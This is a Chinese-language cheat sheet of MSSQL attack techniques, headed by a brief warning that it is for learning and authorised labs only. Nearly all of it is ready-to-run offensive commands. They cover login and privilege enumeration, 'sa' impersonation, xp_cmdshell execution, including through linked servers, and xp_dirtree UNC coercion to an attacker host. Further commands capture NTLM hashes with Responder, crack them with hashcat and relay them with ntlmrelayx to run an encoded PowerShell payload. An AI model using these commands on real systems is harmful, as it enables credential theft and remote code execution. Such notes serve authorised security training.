# MSSQL

::: warning 仅供学习 / 授权实验
UNC 触发认证只在你控制的实验网里指向自己的监听。
:::

```bash
impacket-mssqlclient USER:PASS@TARGET
impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth
```

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
EXECUTE AS LOGIN = 'sa'; REVERT;
EXEC sp_linkedservers;
xp_cmdshell 'whoami';
```

打不开 `xp_cmdshell` 且不是 sa → 换 impersonate / linked server / 出站认证。

## Linked Server

```sql
SELECT * FROM OPENQUERY(LINKED, 'SELECT SYSTEM_USER');
EXEC ('xp_cmdshell ''whoami''') AT LINKED;
```

能 SELECT 不等于能远程执行：看映射账户和 `rpc out`。

## UNC 触发认证

```sql
EXEC master..xp_dirtree '\\LHOST\lab';
```

捕获：

```bash
sudo responder -I eth0
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

中继（目标 SMB 签名未强制）：

```bash
nmap -p445 --script smb2-security-mode TARGET
sudo systemctl stop smbd
impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
  -c "powershell -enc BASE64"
```

SQL 在内网、Kali 达不到时，445 接收点放跳板，见 [隧道](/topics/pivoting)。SOCKS 正向连 SQL 成功，不代表 SQL 能连回 Kali。触发地址填**跳板 IP**。

PowerUpSQL（Windows 会话里，从官方仓库加载）：

```powershell
Get-SQLInstanceDomain
Get-SQLServerInfo -Instance TARGET
Get-SQLQuery -Instance TARGET -Query "SELECT SYSTEM_USER"
```
